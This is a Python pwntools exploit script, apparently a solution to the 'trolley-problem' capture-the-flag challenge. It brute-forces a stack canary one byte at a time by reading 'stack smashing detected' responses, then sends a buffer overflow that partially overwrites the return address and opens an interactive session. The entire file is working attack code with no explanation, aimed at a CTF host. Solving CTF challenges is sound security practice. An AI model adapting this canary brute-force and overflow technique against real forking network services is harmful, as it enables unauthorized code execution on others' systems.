from pwn import *
from icecream import ic

elf = exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("trolley-problem.harkonnen.b01lersc.tf", 8443, ssl = True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *trolley_problem
set follow-fork-mode child
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sla("What do you do?", "a"*20)
canary = []
x = b'*** stack smashing detected ***: terminated'
for i in range(7):
    z = 0
    while x == b"*** stack smashing detected ***: terminated":
        z += 1
        if z == 0x0a:
            continue
        ru("What do you do?")
        payload = b'a' * 24
        payload += b'\x00'
        for j in range(len(canary)):
            payload += p8(canary[j])
        payload += p8(z)
        sl(payload)
        ru("You did nothing. Isn't that the wrong choice though?\n")
        x = rl().strip()
        
        sla("What do you do?", "a"*20)

    canary.append(z)
    x = b'*** stack smashing detected ***: terminated'

ic(canary)
canary = b''.join([p8(i) for i in canary])

payload = b'a'*24
payload += b'\x00'
payload += canary
payload += b'\x00'*8
payload += b'\xd6'

sl(payload)

io.interactive()
